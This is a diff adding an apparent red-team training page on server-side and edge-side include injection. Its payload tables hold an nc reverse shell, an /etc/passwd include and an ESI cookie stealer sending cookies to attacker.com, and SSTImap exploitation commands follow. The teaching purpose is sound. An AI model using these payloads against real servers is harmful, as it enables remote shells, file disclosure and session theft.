@@ -1,0 +1,96 @@
+---
+layout: training-page
+title: "Server Side Include Injection — Red Team Academy"
+module: "Web Hacking"
+tags:
+  - ssi
+  - esi
+  - server-side-include
+  - rce
+  - web
+page_key: "web-ssi-injection"
+---
+<h1>Server Side Include Injection</h1>
+<p>Server Side Includes (SSI) are directives embedded in HTML pages and processed by the web server before the page is sent to the client. They can include files, execute commands, and print environment variables. SSI Injection occurs when unsanitized user input reaches an SSI context, allowing an attacker to execute arbitrary commands on the server.</p>
+
+<h2>SSI Directive Format</h2>
+<pre><code>&lt;!--#directive param="value" --&gt;</code></pre>
+<p>SSI is commonly enabled on Apache and IIS for files with <code>.shtml</code>, <code>.shtm</code>, or <code>.stm</code> extensions, though some configurations apply it to all <code>.html</code> files.</p>
+
+<h2>SSI Injection Payloads</h2>
+<table>
+  <thead>
+    <tr><th>Description</th><th>Payload</th></tr>
+  </thead>
+  <tbody>
+    <tr><td>Print the date</td><td><code>&lt;!--#echo var="DATE_LOCAL" --&gt;</code></td></tr>
+    <tr><td>Print the document name</td><td><code>&lt;!--#echo var="DOCUMENT_NAME" --&gt;</code></td></tr>
+    <tr><td>Print all environment variables</td><td><code>&lt;!--#printenv --&gt;</code></td></tr>
+    <tr><td>Set a variable</td><td><code>&lt;!--#set var="name" value="Rich" --&gt;</code></td></tr>
+    <tr><td>Include a file</td><td><code>&lt;!--#include file="/etc/passwd" --&gt;</code></td></tr>
+    <tr><td>Include a virtual path</td><td><code>&lt;!--#include virtual="/index.html" --&gt;</code></td></tr>
+    <tr><td>Execute a command</td><td><code>&lt;!--#exec cmd="ls" --&gt;</code></td></tr>
+    <tr><td>Reverse shell</td><td><code>&lt;!--#exec cmd="mkfifo /tmp/f;nc IP PORT 0&lt;/tmp/f|/bin/bash 1&gt;/tmp/f;rm /tmp/f" --&gt;</code></td></tr>
+  </tbody>
+</table>
+
+<h2>Detection and Exploitation with SSTImap</h2>
+<p>SSTImap detects and exploits SSTI and SSI injection with its <code>--legacy</code> flag or <code>-e SSI</code> engine selector:</p>
+<pre><code># Basic detection via GET parameter
+python3 ./sstimap.py -u 'https://example.com/page?name=John' --legacy -s
+
+# Interactive mode targeting a vulnerable parameter with SSI engine
+python3 ./sstimap.py -i -u 'https://example.com/page?name=Vulnerable*&message=My_message' -l 5 -e SSI
+
+# POST request with basic auth
+python3 ./sstimap.py -i --legacy -A -m POST -l 5 -H 'Authorization: Basic bG9naW46c2VjcmV0X3Bhc3N3b3Jk'</code></pre>
+
+<h2>Edge Side Inclusion (ESI) Injection</h2>
+<p>Edge Side Includes (ESI) are an XML-based markup language used by HTTP caching proxies (Varnish, Squid, Fastly, Akamai) to assemble web pages from multiple fragments. Caching surrogates cannot distinguish legitimate ESI tags from attacker-injected ones in the HTTP response body, making them a powerful injection vector.</p>
+<p>Some surrogates require ESI to be enabled via the response header:</p>
+<pre><code>Surrogate-Control: content="ESI/1.0"</code></pre>
+
+<h3>ESI Injection Payloads</h3>
+<table>
+  <thead>
+    <tr><th>Description</th><th>Payload</th></tr>
+  </thead>
+  <tbody>
+    <tr><td>Blind detection (SSRF)</td><td><code>&lt;esi:include src=http://attacker.com&gt;</code></td></tr>
+    <tr><td>XSS via remote include</td><td><code>&lt;esi:include src=http://attacker.com/XSSPAYLOAD.html&gt;</code></td></tr>
+    <tr><td>Cookie stealer</td><td><code>&lt;esi:include src=http://attacker.com/steal.php?c=$(HTTP_COOKIE)&gt;</code></td></tr>
+    <tr><td>Include local file</td><td><code>&lt;esi:include src="supersecret.txt"&gt;</code></td></tr>
+    <tr><td>Display debug info</td><td><code>&lt;esi:debug/&gt;</code></td></tr>
+    <tr><td>Add redirect header</td><td><code>&lt;!--esi $add_header('Location','http://attacker.com') --&gt;</code></td></tr>
+    <tr><td>Inline XSS fragment</td><td><code>&lt;esi:inline name="/attack.html" fetchable="yes"&gt;&lt;script&gt;prompt('XSS')&lt;/script&gt;&lt;/esi:inline&gt;</code></td></tr>
+  </tbody>
+</table>
+
+<h3>ESI Feature Support by Surrogate</h3>
+<table>
+  <thead>
+    <tr><th>Software</th><th>Includes</th><th>Vars</th><th>Cookies</th><th>Upstream Header Required</th><th>Host Whitelist</th></tr>
+  </thead>
+  <tbody>
+    <tr><td>Squid3</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td>No</td></tr>
+    <tr><td>Varnish Cache</td><td>Yes</td><td>No</td><td>No</td><td>Yes</td><td>Yes</td></tr>
+    <tr><td>Fastly</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>Yes</td></tr>
+    <tr><td>Akamai ESI Test Server</td><td>Yes</td><td>Yes</td><td>Yes</td><td>No</td><td>No</td></tr>
+    <tr><td>Node.js esi</td><td>Yes</td><td>Yes</td><td>Yes</td><td>No</td><td>No</td></tr>
+    <tr><td>Node.js nodesi</td><td>Yes</td><td>No</td><td>No</td><td>No</td><td>Optional</td></tr>
+  </tbody>
+</table>
+
+<h2>Tools</h2>
+<ul>
+  <li><a href="https://github.com/vladko312/SSTImap">vladko312/SSTImap</a> — Automatic SSTI/SSI detection and exploitation tool</li>
+</ul>
+
+<h2>Resources</h2>
+<ul>
+  <li>Beyond XSS: Edge Side Include Injection — Louis Dion-Marcil — <code>gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection</code></li>
+  <li>ESI Injection Part 2: Abusing Specific Implementations — Philippe Arteau — <code>gosecure.ai/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations</code></li>
+  <li>Exploiting Server Side Include Injection — n00py — <code>n00py.io/2017/08/exploiting-server-side-include-injection/</code></li>
+  <li>Server-Side Includes (SSI) Injection — OWASP — <code>owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection</code></li>
+  <li>DEF CON 26 — Edge Side Include Injection Abusing Caching Servers into SSRF — ldionmarcil</li>
+</ul>
